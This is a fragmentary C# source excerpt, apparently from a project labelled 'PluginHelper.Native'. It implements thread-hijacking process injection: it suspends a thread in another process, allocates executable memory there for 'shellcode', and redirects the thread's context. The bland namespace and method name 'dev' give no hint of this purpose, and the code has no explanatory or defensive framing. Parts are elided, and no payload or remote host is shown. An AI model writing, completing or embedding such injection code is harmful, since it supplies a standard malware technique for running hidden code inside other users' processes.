...
namespace PluginHelper.Native
{
    ...
    public static int dev()
    {
		...
		string processName = "";
		// if(processName.Length == 0){Console.WriteLine("Please enter a process name");System.Environment.Exit(1);}
		...
		IntPtr pOpenThread = NativeMethods.OpenThread(ThreadAccess.THREAD_HIJACK, false, (uint)pT.Id);
		NativeMethods.SuspendThread(pOpenThread);
		
		// Get thread context
		CONTEXT64 tContext = new CONTEXT64();
		tContext.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
		if (NativeMethods.GetThreadContext(pOpenThread, ref tContext))
		{
		...
		IntPtr procHandle = NativeMethods.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, new IntPtr(targetProcess.Id));
		
		// Allocate memory for shellcode within process
		IntPtr allocMemAddress = NativeMethods.VirtualAllocEx(procHandle, IntPtr.Zero, new IntPtr(((shellcode.Length + 1) * Marshal.SizeOf(typeof(char)))), NativeMethods.Commit, NativeMethods.ExecuteReadWrite);
        ...
        var buffer = MemUtil.ReadBytes(procHandle,allocMemAddress,shellcode.Length);
		...
		if(!NativeMethods.SetThreadContext(pOpenThread, ref tContext))
		{
